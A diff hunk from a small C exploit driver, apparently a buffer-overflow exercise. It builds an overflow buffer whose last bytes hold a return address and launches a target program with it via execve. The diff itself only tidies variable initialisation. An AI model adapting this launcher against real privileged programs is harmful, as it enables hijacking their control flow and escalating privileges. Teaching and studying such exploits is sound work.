@@ -18,20 +18,12 @@ void prep(char *buf) {
     *(uint32_t*)(buf + BSIZE - 4) = RET;
 }
 
-int main(void)
-{
-    char *args[3];
-    char *env[1];
+int main(void) {
     char buf[BSIZE + 1];
+    char *args[3] = {TARGET, buf, NULL};
+    char *env[1] = {NULL};
 
     prep(buf);
-
-    args[0] = TARGET;
-    args[1] = buf;
-    args[2] = NULL;
-
-    env[0] = NULL;
-
     execve(TARGET, args, env);
     fprintf(stderr, "execve failed.\n");
 
